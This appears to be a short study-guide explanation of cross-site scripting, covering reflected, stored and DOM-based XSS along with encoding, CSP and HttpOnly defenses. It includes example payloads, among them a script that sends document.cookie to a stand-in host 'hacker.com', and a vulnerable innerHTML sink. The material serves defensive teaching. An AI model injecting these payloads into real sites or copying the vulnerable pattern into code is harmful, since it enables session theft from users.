# XSS (Cross-Site Scripting) 💉

**XSS** is a vulnerability where an attacker injects malicious JavaScript into a trusted website. This code executes in the victim's browser, allowing the attacker to steal cookies, session tokens, or perform actions on behalf of the user.

---

## 1. Types of XSS 🦠

### Reflected XSS (Non-Persistent)
The payload is part of the request (URL parameters) and the server reflects it back in the response immediately.
*   **Scenario**: Search bar results.
*   **Attack**: User clicks `http://site.com/search?q=<script>alert(1)</script>`.
*   **Prevention**: Validate input, Encode output.

### Stored XSS (Persistent)
The payload is stored in the database (e.g., a comment, forum post). Every user who views the page executes the script.
*   **Impact**: High. Can affect thousands of users.
*   **Attack**: Hacker posts a comment: `Great post! <script>fetch('http://hacker.com?cookie='+document.cookie)</script>`.

### DOM-based XSS
The vulnerability exists purely in client-side JavaScript. The server is not involved.
*   **Vulnerable Code**: `document.getElementById('div').innerHTML = location.hash;`
*   **Attack**: `http://site.com#<img src=x onerror=alert(1)>`.

---

## 2. Prevention Strategies 🛡️

### 1. Context-Aware Output Encoding
Never trust user input. Convert special characters into HTML entities before rendering.
*   `<` becomes `&lt;`
*   `>` becomes `&gt;`
*   Modern frameworks (React, Angular, Vue) do this **automatically** (unless you use `dangerouslySetInnerHTML`).

### 2. Content Security Policy (CSP)
(See dedicated CSP chapter). Limit where scripts can load from.

### 3. HttpOnly Cookies
Mark sensitive cookies (Session IDs) as `HttpOnly`. This prevents JavaScript (`document.cookie`) from accessing them, mitigating the damage of XSS.
